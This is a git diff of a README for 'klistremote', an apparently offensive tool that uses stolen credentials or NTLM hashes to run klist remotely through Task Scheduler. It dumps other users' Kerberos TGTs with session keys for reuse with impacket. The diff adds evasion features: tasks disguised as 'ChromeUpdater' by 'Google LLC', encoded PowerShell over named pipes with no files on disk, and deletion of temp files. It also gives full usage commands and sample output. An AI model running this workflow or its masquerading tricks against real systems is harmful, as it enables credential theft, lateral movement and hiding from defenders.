@@ -1,6 +1,6 @@
 # klist
 
-Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that binary's output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely: it connects to a Windows host, runs `klist sessions` and `klist tgt -li <id>` via Task Scheduler, and writes ccache files locally.
+Windows' built-in `klist` binary supports dumping Kerberos TGTs. **klist2ccache** converts that binary's output to ccache format for use with impacket and other Linux Kerberos tooling. **klistremote** does the same thing remotely: it connects to a Windows host, runs `klist sessions` and `klist tgt -li <id>` via **Task Scheduler**, and writes ccache files locally.
 
 ---
 
@@ -80,67 +80,118 @@ python klist2ccache.py -i tgt.txt
 
 Use this when you have credentials to a Windows host and want to dump TGTs from that host without an interactive shell. Same auth and target format as other Impacket tools (e.g. `atexec`, `smbclient`).
 
+By default, command output is written to a temp file under `C:\ProgramData\` on the target, read via `C$`, then deleted. Use **`-named-pipes`** (or the **klistpipes** launcher) to stream output via a PowerShell named pipe over SMB IPC$ instead — no files on disk.
+
+| Mode           | Output        | RPC pipe      | Detail |
+|----------------|---------------|---------------|--------|
+| Default        | File          | `\pipe\atsvc` | Task runs `cmd.exe`; file written to `C:\ProgramData\`, read via C$, deleted |
+| `-named-pipes` | Named pipe    | `\pipe\atsvc` | Task runs PowerShell pipe server; output streamed over IPC$, nothing on disk |
+
 ### What it does
 
-1. **Connects** to the target over SMB and Task Scheduler RPC (same mechanism as `atexec`).
-2. **Runs `klist sessions`** in a scheduled task as **LocalSystem**, redirects output to a file under `C:\Windows\Temp\`, and reads it via the `ADMIN$` share.
-3. **Filters sessions**: keeps every Kerberos logon **except** `Kerberos:Network` (so `Kerberos:Interactive`, `Kerberos:RemoteInteractive`, and any other `Kerberos:*` type are included).
-4. **For each of those sessions**, runs `klist tgt -li 0x<LogonId>` as LocalSystem (again via task → temp file → SMB read).
-5. **Parses** each `klist tgt` output and **writes** one MIT ccache file per TGT (e.g. `user@REALM.COM.ccache`) into the output directory.
+1. **Connects** to the target over SMB + Task Scheduler RPC (`\pipe\atsvc`).
+2. **Runs `klist sessions`** as **LocalSystem** via a scheduled task. Output is either a temp file (read via `C$`, then deleted) or a named pipe over IPC$ (with `-named-pipes`).
+3. **Filters sessions**: keeps every Kerberos logon **except** `Kerberos:Network`.
+4. **Dumps TGTs**: in default mode, all `klist tgt -li` calls are batched into one task; in `-named-pipes` mode, everything runs in a single task.
+5. **Parses** each `klist tgt` output and **writes** one MIT ccache file per TGT locally.
 
-Because the task runs as LocalSystem, session keys are present (no zeroed keys like when running `klist` as a normal user).
+Because execution runs as LocalSystem, session keys are present (no zeroed keys like when running `klist` as a normal user).
 
 ### Requirements
 
 - Credentials that can authenticate to the target (password, NTLM hash, or Kerberos).
-- Permissions to create/run/delete scheduled tasks and to read `ADMIN$\Temp` (same as `atexec`).
-- Target Windows Vista or later.
+- Ability to create/run/delete scheduled tasks and (default mode) read/delete files under `C$` — same as `atexec`.
+- Target Windows Vista or later. With `-named-pipes`, PowerShell 2.0+ is required.
+
+### Modes
+
+**`list`** — Enumerate active Kerberos sessions and print them with their index numbers. No TGTs are retrieved.
+
+**`dump`** — Dump TGTs for all sessions (or a single session by number from `list`) and write ccache files locally.
 
 ### Usage
 
-Same argument style as `atexec` / `smbclient`:
+```bash
+# List Kerberos sessions on target
+python klistremote.py list domain/user@target
+python klistremote.py list -hashes :NTHASH user@target
+
+# Stream output via named pipe (no files on disk)
+python klistremote.py list -named-pipes -hashes :NTHASH user@target
+python klistpipes.py list -hashes :NTHASH user@target        # convenience launcher
+
+# Dump all sessions
+python klistremote.py dump domain/user@target
+python klistremote.py dump -hashes :NTHASH user@target -o ./ccaches
+
+# Dump with named pipes (no files on disk)
+python klistremote.py dump -named-pipes domain/user@target -o ./ccaches
+
+# Dump a single session by number (1-based, from list output)
+python klistremote.py dump domain/user@target -s 2
+python klistremote.py dump -hashes :NTHASH user@target -s 1 -o ./ccaches
+
+# Kerberos auth
+python klistremote.py list -k user@target
+python klistremote.py dump -k user@target
+```
+
+Example — list sessions first, then dump a specific one:
+
+```
+$ python klistremote.py list LUMON/admin@10.10.10.5
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] This will work ONLY on Windows >= Vista
+[*] Connecting to 10.10.10.5 ...
+[*] Enumerating remote Kerberos sessions ...
+[*]   task: \ChromeUpdater  file: ChromeUpdater_48291.dat
+
+  Kerberos sessions on 10.10.10.5:
+
+  [1]  LUMON\jotter     0x154333
+  [2]  LUMON\jotter-pc$ 0x3e4
+
+$ python klistremote.py dump LUMON/admin@10.10.10.5 -s 1 -o ./ccaches
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[!] This will work ONLY on Windows >= Vista
+[*] Connecting to 10.10.10.5 ...
+[*] Enumerating remote Kerberos sessions ...
+[*]   task: \ChromeManager  file: ChromeManager_71053.log
+
+  Sessions to dump:
+
+  [1]  LUMON\jotter  0x154333
+
+[*] Dumping 1 TGT(s) in one task ...
+[*]   task: \ChromeCollector  file: ChromeCollector_92714.log
+[*] [1/1] LUMON\jotter (0x154333) ...
+[*]   -> ./ccaches/jotter@LUMON.COM.ccache
+[*] Done. 1 ccache(s) written to ./ccaches
+```
 
 ```bash
-# NTLM hash
-python klistremote.py -hashes :NTHASH user@target
-
-# Password (will prompt if omitted)
-python klistremote.py domain/user@target
-
-# Output directory for ccache files
-python klistremote.py -hashes :NTHASH user@target -o ./ccaches
-
-# Kerberos
-python klistremote.py -k user@target
-```
-
-Example output:
-
-```
-[*] Connecting to host ...
-[*] Running remote: klist sessions ...
-[*] Found 2 session(s) to dump:
-[*]   - LUMON\jotter  (LogonId 0x154333)
-[*]   - LUMON\jotter-pc$  (LogonId 0x3e4)
-[*] [1/2] LUMON\jotter (0x154333) ...
-[*]   -> ./jotter@LUMON.COM.ccache
-[*] [2/2] LUMON\jotter-pc$ (0x3e4) ...
-[*]   -> ./jotter-pc$@LUMON.COM.ccache
-[*]
-[*] Done. 2 ccache(s) written to .
-[*]
-[*] Use with impacket:
-[*]   export KRB5CCNAME=./jotter@LUMON.COM.ccache
-[*]   impacket-smbclient -k -no-pass LUMON/jotter@target
+export KRB5CCNAME=./ccaches/jotter@LUMON.COM.ccache
+impacket-smbclient -k -no-pass LUMON/jotter@target
 ```
 
 ### OPSEC considerations
 
-- **Task Scheduler** — Creates, runs, and deletes a scheduled task (random 8-letter name) for each command, same pattern as `atexec`. EDR, 4688/4698, Sysmon, or policies that flag “scheduled task + cmd” will see this.
-- **RPC/SMB** — Uses `\pipe\atsvc` and RPC auth (e.g. PKT_PRIVACY). Detection or blocking of atexec-style access applies.
-- **Files on disk** — Leaves temp files under `C:\Windows\Temp\` (e.g. `klist_sess_*.txt`, `klist_tgt_*.txt`). The script does not delete them.
-- **Process/command line** — Task runs `cmd.exe` with `klist sessions` or `klist tgt -li 0x...`. Process/CLI logging will show these; “klist” and “tgt” are distinctive for detection.
-- **Credential theft** — Exports TGTs (with keys) for other users; treat as high-sensitivity. Assume task creation and `klist` execution are visible where EDR/audit/SIEM are deployed.
+- **Task Scheduler** — Creates, runs, and deletes one task for `list`; two tasks for `dump` (sessions + all TGTs batched). Task names, authors, and descriptions are randomised product/company word pairs (e.g. `ChromeUpdater`, author `Google LLC`). All tasks in a single `dump` run share the same product name. EDR, 4688/4698, Sysmon, or policies that flag scheduled task activity will still see it.
+- **RPC/SMB** — Always uses `\pipe\atsvc` (Task Scheduler). RPC auth with PKT_PRIVACY. Same detection surface as `atexec`.
+- **Default (file)** — Output written to `C:\ProgramData\<randomname>` via `cmd.exe`, read via `C$`, then deleted. Process/CLI logging will show `cmd.exe` → `klist`.
+- **`-named-pipes`** — No files on disk. `list` uses one task; `dump` uses one task for everything. Tasks run `powershell.exe -EncodedCommand <base64>`; output streamed over a named pipe on SMB IPC$. The pipe exists only while the process runs. PowerShell script block logging (4104) and AMSI can still decode the command if enabled.
+- **Credential theft** — Exports TGTs (with keys) for other users; treat as high-sensitivity.
+
+### klistpipes launcher
+
+**klistpipes.py** is a convenience launcher that runs klistremote with `-named-pipes` (same argv otherwise). Use it if you prefer the old command name:
+
+```bash
+python klistpipes.py list domain/user@target
+python klistpipes.py dump -hashes :NTHASH user@target -o ./ccaches
+```
 
 ---
 
@@ -157,3 +208,4 @@ You ran `klist` as a normal user. The key is hidden. Run as SYSTEM (or use klist
 
 **Clock skew errors**
 Kerberos requires clocks within 5 minutes. Sync your Linux machine: `sudo ntpdate <dc>` or `sudo timedatectl set-ntp true`.
+
